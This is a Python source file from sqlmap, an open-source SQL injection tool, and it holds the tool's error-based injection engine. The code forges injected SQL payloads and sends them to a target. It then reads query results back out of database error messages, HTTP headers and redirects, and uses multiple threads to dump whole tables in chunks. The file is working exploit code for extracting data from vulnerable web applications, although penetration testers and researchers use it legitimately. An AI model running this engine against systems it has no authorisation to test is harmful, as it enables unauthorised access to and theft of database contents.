#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import re
import time

from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeDbmsHexValue
from lib.core.common import extractRegexResult
from lib.core.common import firstNotNone
from lib.core.common import getConsoleWidth
from lib.core.common import getPartRun
from lib.core.common import getTechnique
from lib.core.common import getTechniqueData
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isListLike
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.common import unArrayizeValue
from lib.core.common import wasLastResponseHTTPError
from lib.core.compat import xrange
from lib.core.convert import decodeHex
from lib.core.convert import getUnicode
from lib.core.convert import htmlUnescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import HTTP_HEADER
from lib.core.exception import SqlmapDataException
from lib.core.settings import CHECK_ZERO_COLUMNS_THRESHOLD
from lib.core.settings import MAX_ERROR_CHUNK_LENGTH
from lib.core.settings import MIN_ERROR_CHUNK_LENGTH
from lib.core.settings import NULL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.settings import ROTATING_CHARS
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request
from lib.utils.progress import ProgressBar
from lib.utils.safe2bin import safecharencode
from thirdparty import six

def _oneShotErrorUse(expression, field=None, chunkTest=False):
    offset = 1
    rotator = 0
    partialValue = None
    threadData = getCurrentThreadData()
    retVal = hashDBRetrieve(expression, checkConf=True)

    if retVal and PARTIAL_VALUE_MARKER in retVal:
        partialValue = retVal = retVal.replace(PARTIAL_VALUE_MARKER, "")
        logger.info("resuming partial value: '%s'" % _formatPartialContent(partialValue))
        offset += len(partialValue)

    threadData.resumed = retVal is not None and not partialValue

    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and kb.errorChunkLength is None and not chunkTest and not kb.testMode:
        debugMsg = "searching for error chunk length..."
        logger.debug(debugMsg)

        seen = set()
        current = MAX_ERROR_CHUNK_LENGTH
        while current >= MIN_ERROR_CHUNK_LENGTH:
            testChar = str(current % 10)

            if Backend.isDbms(DBMS.ORACLE):
                testQuery = "RPAD('%s',%d,'%s')" % (testChar, current, testChar)
            else:
                testQuery = "%s('%s',%d)" % ("REPEAT" if Backend.isDbms(DBMS.MYSQL) else "REPLICATE", testChar, current)
                testQuery = "SELECT %s" % (agent.hexConvertField(testQuery) if conf.hexConvert else testQuery)

            result = unArrayizeValue(_oneShotErrorUse(testQuery, chunkTest=True))
            seen.add(current)

            if (result or "").startswith(testChar):
                if result == testChar * current:
                    kb.errorChunkLength = current
                    break
                else:
                    result = re.search(r"\A\w+", result).group(0)
                    candidate = len(result) - len(kb.chars.stop)
                    current = candidate if candidate != current and candidate not in seen else current - 1
            else:
                current = current // 2

        if kb.errorChunkLength:
            hashDBWrite(HASHDB_KEYS.KB_ERROR_CHUNK_LENGTH, kb.errorChunkLength)
        else:
            kb.errorChunkLength = 0

    if retVal is None or partialValue:
        try:
            while True:
                check = r"(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
                trimCheck = r"(?si)%s(?P<result>[^<\n]*)" % kb.chars.start

                if field:
                    nulledCastedField = agent.nullAndCastField(field)

                    if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)) and not any(_ in field for _ in ("COUNT", "CASE")) and kb.errorChunkLength and not chunkTest:
                        extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(field), expression).group(0)
                        if extendedField != field:  # e.g. MIN(surname)
                            nulledCastedField = extendedField.replace(field, nulledCastedField)
                            field = extendedField
                        nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, kb.errorChunkLength)

                # Forge the error-based SQL injection request
                vector = getTechniqueData().vector
                query = agent.prefixQuery(vector)
                query = agent.suffixQuery(query)
                injExpression = expression.replace(field, nulledCastedField, 1) if field else expression
                injExpression = unescaper.escape(injExpression)
                injExpression = query.replace("[QUERY]", injExpression)
                payload = agent.payload(newValue=injExpression)

                # Perform the request
                page, headers, _ = Request.queryPage(payload, content=True, raise404=False)

                incrementCounter(getTechnique())

                if page and conf.noEscape:
                    page = re.sub(r"('|\%%27)%s('|\%%27).*?('|\%%27)%s('|\%%27)" % (kb.chars.start, kb.chars.stop), "", page)

                # Parse the returned page to get the exact error-based
                # SQL injection output
                output = firstNotNone(
                    extractRegexResult(check, page),
                    extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                    extractRegexResult(check, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                    extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                )

                if output is not None:
                    output = getUnicode(output)
                else:
                    trimmed = firstNotNone(
                        extractRegexResult(trimCheck, page),
                        extractRegexResult(trimCheck, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None),
                        extractRegexResult(trimCheck, listToStrValue((headers[header] for header in headers if header.lower() != HTTP_HEADER.URI.lower()) if headers else None)),
                        extractRegexResult(trimCheck, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None)
                    )

                    if trimmed:
                        if not chunkTest:
                            warnMsg = "possible server trimmed output detected "
                            warnMsg += "(due to its length and/or content): "
                            warnMsg += safecharencode(trimmed)
                            logger.warning(warnMsg)

                        if not kb.testMode:
                            check = r"(?P<result>[^<>\n]*?)%s" % kb.chars.stop[:2]
                            output = extractRegexResult(check, trimmed, re.IGNORECASE)

                            if not output:
                                check = r"(?P<result>[^\s<>'\"]+)"
                                output = extractRegexResult(check, trimmed, re.IGNORECASE)
                            else:
                                output = output.rstrip()

                if any(Backend.isDbms(dbms) for dbms in (DBMS.MYSQL, DBMS.MSSQL, DBMS.SYBASE, DBMS.ORACLE)):
                    if offset == 1:
                        retVal = output
                    else:
                        retVal += output if output else ''

                    if output and kb.errorChunkLength and len(output) >= kb.errorChunkLength and not chunkTest:
                        offset += kb.errorChunkLength
                    else:
                        break

                    if output and conf.verbose in (1, 2) and not any((conf.api, kb.bruteMode)):
                        if kb.fileReadMode:
                            dataToStdout(_formatPartialContent(output).replace(r"\n", "\n").replace(r"\t", "\t"))
                        elif offset > 1:
                            rotator += 1

                            if rotator >= len(ROTATING_CHARS):
                                rotator = 0

                            dataToStdout("\r%s\r" % ROTATING_CHARS[rotator])
                else:
                    retVal = output
                    break
        except:
            if retVal is not None:
                hashDBWrite(expression, "%s%s" % (retVal, PARTIAL_VALUE_MARKER))
            raise

        retVal = decodeDbmsHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, six.string_types):
            retVal = htmlUnescape(retVal).replace("<br>", "\n")

        retVal = _errorReplaceChars(retVal)

        if retVal is not None:
            hashDBWrite(expression, retVal)

    else:
        _ = "(?si)%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def _errorFields(expression, expressionFields, expressionFieldsList, num=None, emptyFields=None, suppressOutput=False):
    values = []
    origExpr = None

    width = getConsoleWidth()
    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = NULL if emptyFields and field in emptyFields else _oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if not any((suppressOutput, kb.bruteMode)):
            if kb.fileReadMode and output and output.strip():
                print()
            elif output is not None and not (threadData.resumed and kb.suppressResumeInfo) and not (emptyFields and field in emptyFields):
                status = "[%s] [INFO] %s: '%s'" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", output if kb.safeCharEncode else safecharencode(output))

                if len(status) > width and not conf.noTruncate:
                    status = "%s..." % status[:width - 3]

                dataToStdout("%s\n" % status)

        if isinstance(num, int):
            expression = origExpr

        values.append(output)

    return values

def _errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@").replace(kb.chars.hash_, "#")

    return retVal

def _formatPartialContent(value):
    """
    Prepares (possibly hex-encoded) partial content for safe console output
    """

    if value and isinstance(value, six.string_types):
        try:
            value = decodeHex(value, binary=False)
        except:
            pass
        finally:
            value = safecharencode(value)

    return value

def errorUse(expression, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(getTechnique())

    abortedFlag = False
    count = None
    emptyFields = []
    start = time.time()
    startLimit = 0
    stopLimit = None
    value = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # Set kb.partRun in case the engine is called from the API
    kb.partRun = getPartRun(alias=False) if conf.api else None

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry at a time
    # NOTE: we assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) and not re.search(SQL_SCALAR_REGEX, expression, re.I):
        expression, limitCond, topLimit, startLimit, stopLimit = agent.limitCondition(expression, dump)

        if limitCond:
            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % ('*' if len(expressionFieldsList) > 1 else expressionFields), 1)

            if " ORDER BY " in countedExpression.upper():
                _ = countedExpression.upper().rindex(" ORDER BY ")
                countedExpression = countedExpression[:_]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = unArrayizeValue(_oneShotErrorUse(countedExpression, countedExpressionFields))

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    debugMsg = "used SQL query returns "
                    debugMsg += "%d %s" % (stopLimit, "entries" if stopLimit > 1 else "entry")
                    logger.debug(debugMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warning(warnMsg)

                stopLimit = 1

            elif not isNumPosStrValue(count):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warning(warnMsg)
                else:
                    value = []  # for empty tables
                return value

            if isNumPosStrValue(count) and int(count) > 1:
                if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                    message = "due to huge table size do you want to remove "
                    message += "ORDER BY clause gaining speed over consistency? [y/N] "

                    if readInput(message, default='N', boolean=True):
                        expression = expression[:expression.index(" ORDER BY ")]

                numThreads = min(conf.threads, (stopLimit - startLimit))

                threadData = getCurrentThreadData()

                try:
                    threadData.shared.limits = iter(xrange(startLimit, stopLimit))
                except OverflowError:
                    errMsg = "boundary limits (%d,%d) are too large. Please rerun " % (startLimit, stopLimit)
                    errMsg += "with switch '--fresh-queries'"
                    raise SqlmapDataException(errMsg)

                threadData.shared.value = BigArray()
                threadData.shared.buffered = []
                threadData.shared.counter = 0
                threadData.shared.lastFlushed = startLimit - 1
                threadData.shared.showEta = conf.eta and (stopLimit - startLimit) > 1

                if threadData.shared.showEta:
                    threadData.shared.progress = ProgressBar(maxValue=(stopLimit - startLimit))

                if kb.dumpTable and (len(expressionFieldsList) < (stopLimit - startLimit) > CHECK_ZERO_COLUMNS_THRESHOLD):
                    for field in expressionFieldsList:
                        if _oneShotErrorUse("SELECT COUNT(%s) FROM %s" % (field, kb.dumpTable)) == '0':
                            emptyFields.append(field)
                            debugMsg = "column '%s' of table '%s' will not be " % (field, kb.dumpTable)
                            debugMsg += "dumped as it appears to be empty"
                            logger.debug(debugMsg)

                if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                    kb.suppressResumeInfo = True
                    debugMsg = "suppressing possible resume console info because of "
                    debugMsg += "large number of rows. It might take too long"
                    logger.debug(debugMsg)

                try:
                    def errorThread():
                        threadData = getCurrentThreadData()

                        while kb.threadContinue:
                            with kb.locks.limit:
                                try:
                                    threadData.shared.counter += 1
                                    num = next(threadData.shared.limits)
                                except StopIteration:
                                    break

                            output = _errorFields(expression, expressionFields, expressionFieldsList, num, emptyFields, threadData.shared.showEta)

                            if not kb.threadContinue:
                                break

                            if output and isListLike(output) and len(output) == 1:
                                output = unArrayizeValue(output)

                            with kb.locks.value:
                                index = None
                                if threadData.shared.showEta:
                                    threadData.shared.progress.progress(threadData.shared.counter)
                                for index in xrange(1 + len(threadData.shared.buffered)):
                                    if index < len(threadData.shared.buffered) and threadData.shared.buffered[index][0] >= num:
                                        break
                                threadData.shared.buffered.insert(index or 0, (num, output))
                                while threadData.shared.buffered and threadData.shared.lastFlushed + 1 == threadData.shared.buffered[0][0]:
                                    threadData.shared.lastFlushed += 1
                                    threadData.shared.value.append(threadData.shared.buffered[0][1])
                                    del threadData.shared.buffered[0]

                    runThreads(numThreads, errorThread)

                except KeyboardInterrupt:
                    abortedFlag = True
                    warnMsg = "user aborted during enumeration. sqlmap "
                    warnMsg += "will display partial output"
                    logger.warning(warnMsg)

                finally:
                    threadData.shared.value.extend(_[1] for _ in sorted(threadData.shared.buffered))
                    value = threadData.shared.value
                    kb.suppressResumeInfo = False

    if not value and not abortedFlag:
        value = _errorFields(expression, expressionFields, expressionFieldsList)

    if value and isListLike(value):
        if len(value) == 1 and isinstance(value[0], (six.string_types, type(None))):
            value = unArrayizeValue(value)
        elif len(value) > 1 and stopLimit == 1:
            value = [value]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d quer%s in %.2f seconds" % (kb.counters[getTechnique()], 'y' if kb.counters[getTechnique()] == 1 else "ies", duration)
        logger.debug(debugMsg)

    return value
